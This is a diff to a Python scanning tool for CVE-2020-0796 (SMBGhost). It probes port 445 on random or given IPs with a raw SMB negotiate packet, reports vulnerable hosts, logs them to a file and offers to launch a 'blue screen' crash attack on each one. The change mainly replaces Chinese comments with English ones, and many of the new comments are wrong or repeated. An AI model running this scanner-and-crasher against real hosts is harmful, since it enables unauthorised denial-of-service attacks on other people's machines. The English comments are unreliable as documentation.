@@ -1,16 +1,15 @@
 #!/usr/bin/python3
-import socket #套接字模块,发送数据用的
-from random import randint as rand #随机模块
-from time import sleep #时间模块,调用的函数是sleep,就是延迟函数
-import struct #处理2进制的模块,处理数据包会用到
-import os #内核模块,调用内核函数的
-import sys #系统模块,调用系统函数
-from netaddr import IPNetwork #处理IP的，处理像192.168.1.0\24这样的内容
-from smbprotocol.connection import Connection
-from smbprotocol.session import Session
-import uuid #uuid
-import re #正则表达式
-#大部分我就不注释了
+import socket #socket module, send and receive data
+from random import randint as rand #random module is used to generate a random number
+from time import sleep #time module is used to generate a random number
+import struct #dec0de binary data
+import os #operation system module is used to get the operating system of the target machine
+import sys #sys module is used to get the operating system of the target machine
+from netaddr import IPNetwork #network address module is used to get the operating system of the target machine
+from smbprotocol.connection import Connection #smbprotocol module is used to get the operating system of the target machine
+from smbprotocol.session import Session #smbprotocol module is used to get the operating system of the target machine
+import uuid #uuid module is used to get the operating system of the target machine
+import re #re module is used to get the operating system of the target machine
 def showIP():
     packet = """
 GET /ip HTTP/1.1
@@ -74,9 +73,7 @@ def randomIP():
 def mode():
     try:
         SMBL = ("""\033[32m
-    +---------------------------------------------------+
     |CVE-2020-0796 SMBGhost|    |your IP:%s|
-    +---------------------------------------------------+
 \033[0m"""%(showIP()))
         if len(sys.argv) == 1:
             print(SMBL)
@@ -130,41 +127,41 @@ command:
         print("[\033[31m-\033[0m]byebye")
 def main(IP):
     try:
-        port=445 #将445数字定义为port变量
-        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #定义socket的.. AF_INET是使用ipv4的,SOCK_STREAM是使用TCP数据   
+        port=445 #default port
+        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock: #create socket,AF_INET is IPv4,SOCK_STREAM is TCP
             sock.settimeout(5)
-            scan = sock.connect_ex((IP,port)) #对445端口发送一个数据包,测试445端口是否开启，开启则返回0，没有开启则返回其他数
-            if scan == 0: #如果打开则运行此行
+            scan = sock.connect_ex((IP,port)) #testing port status
+            if scan == 0: #if port is open or filtered,then print the IP
                 print("[\033[32minfo\033[0m]IP %s --- PORT 445 OPEN/FILTRTED"% IP)
                 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
                     smb.settimeout(30)
                     try:
-                        smb.connect((IP, port)) 
-                    except:
+                        smb.connect((IP, port)) #connect to the target
+                    except: #if connect failed,then print the IP
                         smb.close()
-                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #发送数据包,sendall函数是发送完整的tcp数据包与send函数类似
-                    b, = struct.unpack(">I", smb.recv(4)) #处理返回回来的2字节的二进制数据包 
-                    recv = smb.recv(b) #处理数据包
+                    smb.send(b'\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02"\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\n\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00') #send vulnerable SMB payload
+                    b, = struct.unpack(">I", smb.recv(4)) #decode binary data 
+                    recv = smb.recv(b) #receive data
                     exploitCheck = (b"\x11\x03\x02\x00")
-                    if recv[68:72] != exploitCheck: #判断是否存在\x11\x03\x02\x00数据
-                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #如果存在则显示此行 
+                    if recv[68:72] != exploitCheck: #if the data is not vulnerable,then print the IP
+                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #if receive data is not vulnerable,then print the IP
                     elif recv[68:72] == exploitCheck: 
-                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #如果不存在则显示此行
+                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #if the data is vulnerable,then print the IP
                         exp=input("[\033[33minfo\033[0m]bule screen attack(Y/n)#")
                         if exp == "Y" or exp == "y":
                             bule_screen(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
                         elif exp == "N" or exp == "n":
                             pass
-                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #保存显示有漏洞的主机,os.getcwd()函数是显示终端所在的路径
-                            for i in "%s"%(IP): #循环..
-                                f.write(i) #写入
+                        with open(os.getcwd()+"/cve_2020_0796-host.txt",mode="a") as f: #write the IP to the file
+                            for i in "%s"%(IP): #write the IP to the file
+                                f.write(i) #write the IP to the file
                             f.close()
-            else: #判断
-                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #如果对方没有打开445则显示此行
-    except KeyboardInterrupt: #当ctrl+c时则执行此行
+            else: #if port is not open or filtered,then print the IP
+                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #if port is not open,then print the IP
+    except KeyboardInterrupt: #if user interrupt,print error
         print("[\033[33m-\033[0m]byebye!")
-        exit(1) #退出代码为1，就是异常退出
-    except ConnectionResetError: #如果连接失败则显示此行
+        exit(1) #exit
+    except ConnectionResetError: #if connection reset,print error
         print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
     except socket.gaierror:
         print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
